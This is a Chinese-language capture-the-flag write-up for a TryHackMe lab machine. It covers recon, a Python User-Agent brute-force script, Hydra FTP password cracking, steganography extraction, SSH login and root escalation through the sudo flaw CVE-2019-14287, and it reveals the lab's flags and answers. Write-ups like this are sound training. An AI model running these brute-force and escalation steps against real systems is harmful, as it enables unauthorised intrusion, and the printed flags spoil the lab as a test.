# Agent Sudo Writeup
> URL: https://tryhackme.com/room/agentsudoctf

IP : 10.10.119.64

## Recon
- 老梗 `nmap -A 10.10.119.64`
	- ![](https://i.imgur.com/n3zFLNJ.png)
	- 發現有開
		- FTP
		- SSH
		- HTTP
- 嘗試進入 HTTP
	- ![](https://i.imgur.com/V7uzsli.png)
	- 看到他說需要在 useragent 放 `Codename`  (機密代號)
	- 又說 Dear agent, 下面有說 `Agent R`
	- 所以基本上可以先猜測 Agent `A` 到 `Z`

## 爆猜機密代號
- 瀏覽器沒有太方便，所以我們先把瀏覽器 request 轉 `curl`
	- ![](https://i.imgur.com/gcmLsCg.png)
	- 對著 F12 的 Reuest 右鍵，`Copy as cURL`
	- `curl 'http://10.10.119.64/' -H 'User-Agent: meow' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' -H 'Pragma: no-cache'`

- curl 轉 Python request
	- 我使用這個網站 https://curl.trillworks.com/
		- 把 curl 貼上就可以自動轉 python 的 request 了
	- 接下來寫一段扣爆破
	- ```python=
		import requests


		for i in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
			headers = {
				'User-Agent': i ,
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
				'Accept-Language': 'en-US,en;q=0.5',
				'Connection': 'keep-alive',
				'Upgrade-Insecure-Requests': '1',
				'Cache-Control': 'max-age=0, no-cache',
				'Pragma': 'no-cache',
			}

			response = requests.get('http://10.10.119.64/', headers=headers).text
			print(i,len(response))
		```
	- 因為如果猜錯他會回傳的字都是一樣的，那就猜測輸入正確時，他回傳的東西會不一樣，所以最簡單的方法可以用字串長度來比對，輸入錯誤時長度是 `218`
	- ![](https://i.imgur.com/HcfzzS4.png)
	- 運氣很好，`C` 就猜到ㄌ

- 用 `User-Agent:C` 發 request
	- ![](https://i.imgur.com/w7mG4xG.png)
		- 在 Firefox 上使用右鍵， Edit and Resend
	- ![](https://i.imgur.com/3R51Syu.png)
		- 修改 `User-Agent` 為 C 並送出
	- 可以發現他自動跳轉到這個網頁
		- http://10.10.119.64/agent_C_attention.php
		- ![](https://i.imgur.com/xqNapEK.png)
		- 內文中發現了 Agent C 叫做 `chris`
		- 而且他的主管在嘴他說使用弱密碼
## FTP
- 嘗試爆破 FTP
	- 因為 nmap 有掃到 ssh 跟 ftp，隨便取 ftp
	- 透過 Hydra + Rockyou 字典來爆
		- `hydra -l chris -P /opt/rockyou.txt ftp://10.10.119.64`
	- ![](https://i.imgur.com/xlSxZOe.png)
	- 可以了解到帳號為 `chris`
	- 密碼為 `crystal`

- 嘗試登入 FTP
	- `ftp 10.10.119.64`
	- ![](https://i.imgur.com/CO99QUz.png)
	- 輸入 `ls` 觀察 ftp 裡面的檔案
		- ![](https://i.imgur.com/J8Qx4iA.png)
	- 輸入 `get 檔名` 把檔案依序載下來
	- ![](https://i.imgur.com/xHrtO12.png)
- 觀察 txt 檔案
	- `cat To_agentJ.txt`
	- ![](https://i.imgur.com/An6TWpm.png)
	- 他說兩張照片都是假ㄉ，裡面有藏東東
## Stego
- 起手式 strings
	- `strings cutie.png`
	- ![](https://i.imgur.com/ykQ85yu.png)
	- 可以發現裡面藏了一點點的字，但是用奇怪的編碼或加密QQ
- 透過 binwalk 觀察是否裡面有藏檔案
	- ![](https://i.imgur.com/RJMynFJ.png)
	- 發現 png 後面塞了一個 zip
- 透過 foremost 解出裡面的檔案
	- `foremost cutie.png`
	- ![](https://i.imgur.com/kMUJoXd.png)
	- 會發現資料夾裡面有一包 zip
	- ![](https://i.imgur.com/HUQX7Ov.png)
- 解壓縮 zip
	- 用最直覺的 `unzip` 
		- ![](https://i.imgur.com/OoGnr1v.png)
		- 會發現噴錯
		- 跟據[這篇](https://askubuntu.com/questions/596761/error-while-unzipping-need-pk-compat-v5-1-can-do-v4-6)的講法，可以用 7z 來解 
	- `7z x 00000067.zip`
		- ![](https://i.imgur.com/0tfoRZr.png)
		- 用 7z 解，會發現 zip 需要密碼
- 爆破 zip 密碼
	- 先把 zip 轉成 約翰格式
	- `zip2john  00000067.zip > j.txt`
	- `john j.txt --wordlist=/opt/rockyou.txt`
	- 就可以取得密碼為 `alien`
	- ![](https://i.imgur.com/VhdQ6ME.png)
- 解壓縮 zip
	- `7z x 00000067.zip`
	- 並使用密碼 `alien` 即可解壓完畢
	- ![](https://i.imgur.com/ZzuI3lQ.png)
	- 解壓內容可以看到一組奇怪的密碼 `QXJlYTUx`
	- 透過 base64 解碼
		- `base64 -d <<< QXJlYTUx`
			- ![](https://i.imgur.com/H0TRSgS.png)
		- 即可獲得 `Area51`
- 接下來看到另外一個檔案
	- `cute-alien.jpg`
	- 這邊使用 `steghide` 進行解密
	- `steghide extract -sf cute-alien.jpg`
		- 並搭配 `Area51`
	- ![](https://i.imgur.com/XNbSHRD.png)
		- 發現成功的解出了 `message.txt`
		- ![](https://i.imgur.com/uIkrnoy.png)
- 我們可以發現文章內
	- 使用者 : `james`
	- 密碼 : `hackerrules!`
## SSH 
- 透過 SSH 進行登入
	- `ssh james@10.10.119.64`
	- ![](https://i.imgur.com/kQnYXHF.png)

- 尋找到 `user_flag.txt`
	- ![](https://i.imgur.com/Hbe1LbA.png)
	- `b03d975e8c92a7c04146cfa7a5a313c7`

## 提權
- 輸入 `sudo -l` 
	- ![](https://i.imgur.com/MxoRJ33.png)
	- 所以我們不能以 root 身分執行`/bin/bash` 
- What is the incident of the photo called?
	- 裡面還找到了一張照片
	- ![](https://i.imgur.com/aAqWceo.png)
	- 透過 Google 以圖搜圖可以找到[這篇](https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment)新聞
	- `Roswell alien autopsy`
- 繼續提權
	- 透過 scp 上傳 Linpeas
		- 本機
			- `scp linpeas.sh james@10.10.119.64:/tmp`
			- ![](https://i.imgur.com/0xkBXzm.png)
		- 遠端
			- `bash linpeas.sh | tee meow.txt`
- 可以觀察到 Linpeas 把 sudo 版本變紅色
	- ![](https://i.imgur.com/zpru0me.png)
	- 透過Google `Sudo  1.8.21p2`
		- 可以找到 `CVE-2019-14287`
		- https://www.exploit-db.com/exploits/47502
	- 遠端機器剛好有 python 跟 vim
		- 那就直接開 vim 把 exploit 給貼上
		- ![](https://i.imgur.com/uDhuoI0.png)

- 把 python exploit code 給 run 起來
	- 詢問使用者名稱，就輸入 `james`
	- ![](https://i.imgur.com/DUiJN5U.png)
	- 成功提權!
- 取得 root flag
	- ![](https://i.imgur.com/n85MNfD.png)
	- `b53a02f55b57d4439e3341834d70c062`
- (Bonus) Who is Agent R?
 	- 信最後 有寫 `DesKel` aka Agent R
 	- 阿不是阿，你名字裡哪裡有 R ㄌ ?__?